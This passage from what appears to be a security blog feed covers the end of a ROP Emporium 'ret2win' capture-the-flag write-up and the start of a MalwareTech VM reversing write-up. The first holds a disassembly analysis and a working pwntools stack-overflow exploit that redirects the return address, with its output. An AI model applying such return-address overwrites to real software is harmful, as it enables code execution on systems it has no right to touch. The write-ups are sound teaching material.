   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x0000000000400733&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;75&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;lea&lt;/span&gt;    rax,[rbp&lt;span style=&#34;color:#5bc4bf&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;0x20&lt;/span&gt;]
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x0000000000400737&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;79&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;mov&lt;/span&gt;    edx,&lt;span style=&#34;color:#f99b15&#34;&gt;0x38&lt;/span&gt;
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x000000000040073c&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;84&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;mov&lt;/span&gt;    rsi,rax
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x000000000040073f&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;87&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;mov&lt;/span&gt;    edi,&lt;span style=&#34;color:#f99b15&#34;&gt;0x0&lt;/span&gt;
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x0000000000400744&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;92&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;call&lt;/span&gt;   &lt;span style=&#34;color:#f99b15&#34;&gt;0x400590&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;read@plt&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x0000000000400749&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;97&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;mov&lt;/span&gt;    edi,&lt;span style=&#34;color:#f99b15&#34;&gt;0x40091b&lt;/span&gt;
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x000000000040074e&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;102&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;call&lt;/span&gt;   &lt;span style=&#34;color:#f99b15&#34;&gt;0x400550&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;puts@plt&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x0000000000400753&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;107&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;nop&lt;/span&gt;
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x0000000000400754&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;108&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;leave&lt;/span&gt;  
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x0000000000400755&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;109&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;ret&lt;/span&gt;    
&lt;span style=&#34;color:#06b6ef&#34;&gt;End&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;of&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;assembler&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;dump.&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;From the disassembled code above, we are filling a buffer of size 0x20(32bytes) with a constant byte of zero. &lt;strong&gt;memset&lt;/strong&gt; is used to overwrite any values present memory area specified. The memory are we are overwriting is [rbp-0x20]. This means we are allocating a memory buffer of size  32 bytes from the address of base pointer as shown in the stack diagram below.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://thuri10.github.io/post/ropemporium/stack.png&#34; &gt;
		&lt;img src=&#34;https://thuri10.github.io/post/ropemporium/stack.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Therefore the next function is &lt;strong&gt;read&lt;/strong&gt; function, which reads from the standard input file descriptor and stores in the specified buffer.From the disassembled code we see we are reading 0x38 bytes from the user input and storing it in our buffer.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;read(&lt;span style=&#34;color:#f99b15&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#5bc4bf&#34;&gt;*&lt;/span&gt;[rbp&lt;span style=&#34;color:#5bc4bf&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;0x20&lt;/span&gt;], &lt;span style=&#34;color:#f99b15&#34;&gt;0x38&lt;/span&gt;) &lt;span style=&#34;color:#776e71&#34;&gt;//0 is file descriptor stdin
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Because we are reading more than the buffer can hold, we corrupt the adjacent memory regions therefore casusing a stack buffer overflow. Therefore in order to control the return address as shown in the stack image shown above is to fill the buffer, overwrite the rbp register and control the return address with our desired address which is &lt;strong&gt;ret2win&lt;/strong&gt; function address.&lt;/p&gt;
&lt;h2 id=&#34;exploit&#34;&gt;Exploit&lt;/h2&gt;
&lt;p&gt;The exploit code for this ret2win function is,&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python3&#34; data-lang=&#34;python3&#34;&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#fec418&#34;&gt;pwn&lt;/span&gt;

pwn&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;context&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;encoding &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#48b685&#34;&gt;&amp;#34;latin-1&amp;#34;&lt;/span&gt; 
pwn&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;warnings&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;simplefilter(&lt;span style=&#34;color:#48b685&#34;&gt;&amp;#34;ignore&amp;#34;&lt;/span&gt;)
pwn&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;context&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;arch &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#48b685&#34;&gt;&amp;#34;amd64&amp;#34;&lt;/span&gt;

io &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; pwn&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;process(&lt;span style=&#34;color:#48b685&#34;&gt;&amp;#39;./ret2win&amp;#39;&lt;/span&gt;)

payload &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#48b685&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#48b685&#34;&gt;&amp;#34;A&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#f99b15&#34;&gt;32&lt;/span&gt; &lt;span style=&#34;color:#776e71&#34;&gt;# fill the buffer&lt;/span&gt;
payload &lt;span style=&#34;color:#5bc4bf&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#48b685&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#48b685&#34;&gt;&amp;#34;B&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#f99b15&#34;&gt;8&lt;/span&gt;  &lt;span style=&#34;color:#776e71&#34;&gt;#overwrite saved base pointer&lt;/span&gt;
payload &lt;span style=&#34;color:#5bc4bf&#34;&gt;+=&lt;/span&gt; pwn&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;p64(&lt;span style=&#34;color:#f99b15&#34;&gt;0x400756&lt;/span&gt;)  &lt;span style=&#34;color:#776e71&#34;&gt;#Address of ret2win function&lt;/span&gt;
io&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;writeafter(&lt;span style=&#34;color:#48b685&#34;&gt;&amp;#39;&amp;gt;&amp;#39;&lt;/span&gt;, payload)

pwn&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;info(io&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;clean()&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;decode())
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Running the script we get the flag.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;vx@archie:ret2win$ python3 x.py 
&lt;span style=&#34;color:#5bc4bf&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#5bc4bf&#34;&gt;]&lt;/span&gt; Starting local process &lt;span style=&#34;color:#48b685&#34;&gt;&amp;#39;./ret2win&amp;#39;&lt;/span&gt;: pid &lt;span style=&#34;color:#f99b15&#34;&gt;45427&lt;/span&gt;
&lt;span style=&#34;color:#5bc4bf&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#5bc4bf&#34;&gt;]&lt;/span&gt;  Thank you!
    Well &lt;span style=&#34;color:#815ba4&#34;&gt;done&lt;/span&gt;! Here&lt;span style=&#34;color:#48b685&#34;&gt;&amp;#39;s your flag:
&lt;/span&gt;&lt;span style=&#34;color:#48b685&#34;&gt;    ROPE{a_placeholder_32byte_flag!}
&lt;/span&gt;&lt;span style=&#34;color:#48b685&#34;&gt;[*] Process &amp;#39;&lt;/span&gt;./ret2win&lt;span style=&#34;color:#ef6155&#34;&gt;&amp;#39;&lt;/span&gt; stopped with exit code &lt;span style=&#34;color:#f99b15&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;pid 45427&lt;span style=&#34;color:#5bc4bf&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>Reversing MalwareTech 8-bit Bytecode Virtual Machine</title>
        <link>https://thuri10.github.io/p/reversing-malwaretech-8-bit-bytecode-virtual-machine/</link>
        <pubDate>Tue, 07 Dec 2021 19:02:24 +0300</pubDate>
        
        <guid>https://thuri10.github.io/p/reversing-malwaretech-8-bit-bytecode-virtual-machine/</guid>
        <description>&lt;img src="https://thuri10.github.io/post/mal/vm.jpg" alt="Featured image of post Reversing MalwareTech 8-bit Bytecode Virtual Machine" /&gt;&lt;p&gt;Challenge description.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;vm1.exe implements a simple 8-bit virtual machine (VM) to try and stop reverse engineers from retrieving the flag. The VM’s RAM contains the encrypted flag and some bytecode to decrypt it. Can you figure out how the VM works and write your own to decrypt the flag? A copy of the VM’s RAM has been provided in ram.bin (this data is identical to the ram content of the malware’s VM before execution and contains both the custom assembly code and encrypted flag).&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;introduction&#34;&gt;Introduction&lt;/h2&gt;
&lt;p&gt;Main function analysis&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://thuri10.github.io/post/mal/vmq.png&#34; &gt;
		&lt;img src=&#34;https://thuri10.github.io/post/mal/vmq.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			alt=&#34;Main Function&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Main Function&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;From the above image the &lt;strong&gt;HeapAlloc&lt;/strong&gt; function allocates a block of memory from a heap. Heapalloc function above,allocates a memory block of size &lt;strong&gt;0x1FB&lt;/strong&gt; bytes. The pointer of the allocated memory block is called  allocated_memblock as shown in the image.&lt;/p&gt;
&lt;p&gt;The program does a &lt;strong&gt;memcpy&lt;/strong&gt; of the content stored in the rambin offset to the new allocated memory block.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#fec418&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;memcpy&lt;/span&gt;(&lt;span style=&#34;color:#fec418&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;*&lt;/span&gt;dest,&lt;span style=&#34;color:#815ba4&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#fec418&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;*&lt;/span&gt;src, size_t count);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Memcpy functions copies data from the source address to destination address of size 0x1fb. The destination address of this program is the allocate_memblock. Examining the bytes in the rambin file provided as part of the challenge and the  content at rambin offset are the same as shown in the image below.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://thuri10.github.io/post/mal/rambin.png&#34; &gt;
		&lt;img src=&#34;https://thuri10.github.io/post/mal/rambin.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			alt=&#34;Rambin&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Rambin&lt;/figcaption&gt;
	
&lt;/figure&gt; &lt;figure 
	&gt;
	&lt;a href=&#34;https://thuri10.github.io/post/mal/ida_hex.png&#34; &gt;
		&lt;img src=&#34;https://thuri10.github.io/post/mal/ida_hex.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			alt=&#34;IDA HEX&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;IDA HEX&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Next step is to analyze the &lt;strong&gt;sub_4022E0&lt;/strong&gt; function. The disassembled function graph looks like the one below.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://thuri10.github.io/post/mal/vmflow.png&#34; &gt;
		&lt;img src=&#34;https://thuri10.github.io/post/mal/vmflow.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			alt=&#34;sub_4022E0 control flow loop&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;sub_4022E0 control flow loop&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;From the disassembly above, the binary is doing some byte operations. The first graph block is doing a bitwise AND operation, which is responsible for setting both SF and ZF to zero.First it sets the value of eax register to 1, and then do a test operation. Because the conditional &lt;strong&gt;&amp;ldquo;jump if zero&amp;rdquo;&lt;/strong&gt; is not true, we continue our execution to the next control block.&lt;/p&gt;
&lt;p&gt;We do decompilation of the function using NSA ghidra tool.The decompiled of the function is shown below.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;
&lt;span style=&#34;color:#fec418&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#06b6ef&#34;&gt;FUN_004022e0&lt;/span&gt;(&lt;span style=&#34;color:#fec418&#34;&gt;void&lt;/span&gt;)

{
  byte bVar1;
  uint uVar2;
  byte bVar3;
  byte counter;
  
  counter &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f99b15&#34;&gt;0&lt;/span&gt;;
  &lt;span style=&#34;color:#815ba4&#34;&gt;do&lt;/span&gt; {
                    &lt;span style=&#34;color:#776e71&#34;&gt;/* 0 */&lt;/span&gt;
    uVar2 &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; (uint)counter;
                    &lt;span style=&#34;color:#776e71&#34;&gt;/* 2 */&lt;/span&gt;
    bVar1 &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; counter &lt;span style=&#34;color:#5bc4bf&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f99b15&#34;&gt;1&lt;/span&gt;;
    bVar3 &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; counter &lt;span style=&#34;color:#5bc4bf&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f99b15&#34;&gt;2&lt;/span&gt;;
    counter &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; counter &lt;span style=&#34;color:#5bc4bf&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f99b15&#34;&gt;3&lt;/span&gt;;
    uVar2 &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; FUN_00402270((uint)&lt;span style=&#34;color:#5bc4bf&#34;&gt;*&lt;/span&gt;(byte &lt;span style=&#34;color:#5bc4bf&#34;&gt;*&lt;/span&gt;)(allocated_memblock &lt;span style=&#34;color:#5bc4bf&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f99b15&#34;&gt;0xff&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;+&lt;/span&gt; uVar2),
                         (uint)&lt;span style=&#34;color:#5bc4bf&#34;&gt;*&lt;/span&gt;(byte &lt;span style=&#34;color:#5bc4bf&#34;&gt;*&lt;/span&gt;)(allocated_memblock &lt;span style=&#34;color:#5bc4bf&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f99b15&#34;&gt;0xff&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;+&lt;/span&gt; (uint)bVar1),
                         (uint)&lt;span style=&#34;color:#5bc4bf&#34;&gt;*&lt;/span&gt;(byte &lt;span style=&#34;color:#5bc4bf&#34;&gt;*&lt;/span&gt;)(allocated_memblock &lt;span style=&#34;color:#5bc4bf&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f99b15&#34;&gt;0xff&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;+&lt;/span&gt; (uint)bVar3));
  } &lt;span style=&#34;color:#815ba4&#34;&gt;while&lt;/span&gt; ((uVar2 &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#f99b15&#34;&gt;0xff&lt;/span&gt;) &lt;span style=&#34;color:#5bc4bf&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#f99b15&#34;&gt;0&lt;/span&gt;);
  &lt;span style=&#34;color:#815ba4&#34;&gt;return&lt;/span&gt; uVar2;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The above c-code like is more easier to understand than the assembly code. From the analysis of the code, we are doing a while loop.The assembly equivalent of this operation is as the one shown in the first memory block of the function.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-nasm&#34; data-lang=&#34;nasm&#34;&gt;loc_4022EA:
&lt;span style=&#34;color:#06b6ef&#34;&gt;mov&lt;/span&gt;     eax, &lt;span style=&#34;color:#f99b15&#34;&gt;1&lt;/span&gt;
&lt;span style=&#34;color:#06b6ef&#34;&gt;test&lt;/span&gt;    eax, eax
&lt;span style=&#34;color:#06b6ef&#34;&gt;jz&lt;/span&gt;      &lt;span style=&#34;color:#ef6155&#34;&gt;short&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;loc_402367&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Therefore, we call the function &lt;strong&gt;FUN_00402270&lt;/strong&gt; while passing three arguments.The control graph below shows various operation executed by the binary depending on the argument passed to the function.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://thuri10.github.io/post/mal/vmflow2.png&#34; &gt;
		&lt;img src=&#34;https://thuri10.github.io/post/mal/vmflow2.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			alt=&#34;control flow loop&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;control flow loop&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;From the above graph, the function does a compare on the arguments passed with either 1, 2 or 3. If the condition is fulfilled, that operation branch is executed as shown in the image above.&lt;/p&gt;
&lt;p&gt;Example: &lt;strong&gt;if the argument value passed is 1, control flow branch to loc_4022E address as shown in the graph&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;For better understanding of the control flow, we decompile the function using ghidra, because &lt;strong&gt;idafree&lt;/strong&gt; does not support x86 decompilation.The &amp;ldquo;C-like style&amp;rdquo; of the code looks like the one below.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;
&lt;span style=&#34;color:#fec418&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#06b6ef&#34;&gt;FUN_00402270&lt;/span&gt;(&lt;span style=&#34;color:#fec418&#34;&gt;int&lt;/span&gt; value1,&lt;span style=&#34;color:#fec418&#34;&gt;int&lt;/span&gt; value2,&lt;span style=&#34;color:#fec418&#34;&gt;int&lt;/span&gt; param_3)

{
  &lt;span style=&#34;color:#815ba4&#34;&gt;if&lt;/span&gt; (value1 &lt;span style=&#34;color:#5bc4bf&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#f99b15&#34;&gt;1&lt;/span&gt;) {
    &lt;span style=&#34;color:#5bc4bf&#34;&gt;*&lt;/span&gt;(undefined &lt;span style=&#34;color:#5bc4bf&#34;&gt;*&lt;/span&gt;)(allocated_memblock &lt;span style=&#34;color:#5bc4bf&#34;&gt;+&lt;/span&gt; value2) &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; (undefined)param_3;
  }
  &lt;span style=&#34;color:#815ba4&#34;&gt;else&lt;/span&gt; {
    &lt;span style=&#34;color:#815ba4&#34;&gt;if&lt;/span&gt; (value1 &lt;span style=&#34;color:#5bc4bf&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#f99b15&#34;&gt;2&lt;/span&gt;) {
      value1 &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; allocated_memblock &lt;span style=&#34;color:#5bc4bf&#34;&gt;+&lt;/span&gt; value2;
      DAT_00404240 &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;*&lt;/span&gt;(byte &lt;span style=&#34;color:#5bc4bf&#34;&gt;*&lt;/span&gt;)value1;
    }
    &lt;span style=&#34;color:#815ba4&#34;&gt;else&lt;/span&gt; {
      &lt;span style=&#34;color:#815ba4&#34;&gt;if&lt;/span&gt; (value1 &lt;span style=&#34;color:#5bc4bf&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#f99b15&#34;&gt;3&lt;/span&gt;) {
        &lt;span style=&#34;color:#815ba4&#34;&gt;return&lt;/span&gt; value1 &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#f99b15&#34;&gt;0xffffff00&lt;/span&gt;;
      }
      value1 &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; allocated_memblock &lt;span style=&#34;color:#5bc4bf&#34;&gt;+&lt;/span&gt; value2;
      &lt;span style=&#34;color:#5bc4bf&#34;&gt;*&lt;/span&gt;(byte &lt;span style=&#34;color:#5bc4bf&#34;&gt;*&lt;/span&gt;)(allocated_memblock &lt;span style=&#34;color:#5bc4bf&#34;&gt;+&lt;/span&gt; value2) &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;*&lt;/span&gt;(byte &lt;span style=&#34;color:#5bc4bf&#34;&gt;*&lt;/span&gt;)value1 &lt;span style=&#34;color:#5bc4bf&#34;&gt;^&lt;/span&gt; DAT_00404240;
    }
  }
  &lt;span style=&#34;color:#815ba4&#34;&gt;return&lt;/span&gt; CONCAT31((int3)((uint)value1 &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#f99b15&#34;&gt;8&lt;/span&gt;),&lt;span style=&#34;color:#f99b15&#34;&gt;1&lt;/span&gt;);
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The decompilation output of ghidra is not optimal, therefore decompiled code contains some cast which can be fixed by setting the correct data types in the functional signatures of the function.Because this is an easy VM, we can implement the above code in a python3 script in order to decrypt the contents of &lt;strong&gt;ram.bin&lt;/strong&gt; file.&lt;/p&gt;
&lt;h2 id=&#34;solution&#34;&gt;Solution&lt;/h2&gt;
&lt;p&gt;Fully implemented solution code is below.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python3&#34; data-lang=&#34;python3&#34;&gt;&lt;span style=&#34;color:#776e71&#34;&gt;#implement decryption routine function in python&lt;/span&gt;
&lt;span style=&#34;color:#776e71&#34;&gt;#solution.py&lt;/span&gt;
